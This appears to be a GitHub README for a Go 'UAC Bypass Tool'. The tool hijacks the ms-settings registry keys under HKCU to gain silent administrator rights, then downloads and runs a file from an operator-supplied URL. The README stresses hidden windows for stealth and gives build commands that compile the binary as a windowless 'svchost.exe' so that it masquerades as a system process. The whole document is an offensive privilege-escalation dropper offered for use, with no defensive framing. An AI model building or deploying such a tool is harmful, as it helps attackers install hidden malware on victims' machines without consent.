# UAC Bypass Tool 🚀

This is a proof-of-concept (PoC) tool for bypassing User Account Control (UAC) on Windows systems. The tool leverages registry modifications and process execution to elevate privileges without user interaction.

---

## Features ✨

- **UAC Bypass**: Executes code with elevated privileges without triggering the UAC prompt.
- **File Downloader**: Downloads a specified file from a URL to a temporary directory.
- **Registry Manipulation**: Modifies the Windows registry to exploit UAC bypass techniques.
- **Silent Execution**: Executes processes and commands with hidden windows for stealthy operation.
- **Cleanup**: Automatically reverts registry changes after execution.

---

## How It Works 🛠️

1. **Admin Privilege Check**: The tool verifies if it is running with administrator privileges.
2. **Registry Exploit**: If not running as admin, it modifies specific registry keys under `HKCU\Software\Classes` to execute the tool with elevated privileges using the `ms-settings` protocol.
3. **File Download and Execution**: Once elevated, it downloads a file from a specified URL to a temporary directory and executes it.
4. **Registry Cleanup**: Restores the registry to its original state after execution.

---
## Usage 🚀

1. Edit the source code to specify the file URL to download and its name:
   ```go
   fileUrl := "https://example.com/yourfile.exe" // Replace with your URL
   tempPath := os.TempDir() + string(os.PathSeparator) + "yourfile.exe" // Replace with desired file name
   ```
2. Run the compiled executable:
   ```bash
   uac_bypass.exe
   ```
3. The tool will:
   - Elevate privileges if necessary.
   - Download the file from the specified URL.
   - Execute the downloaded file.

---
## Installation 💻

### Prerequisites

- **Go Programming Language**: Installed on your system. (Version 1.16+ recommended)
- **Windows**: This tool uses Windows-specific APIs and will not work on other operating systems.

### Steps to Build

1. Clone the repository:
   ```bash
   git clone https://github.com/LAPSUS-GROUP/UAC-Bypass.git
2. Compile Code:
   ```bash
   go build -ldflags="-H windowsgui" -o svchost.exe main.go
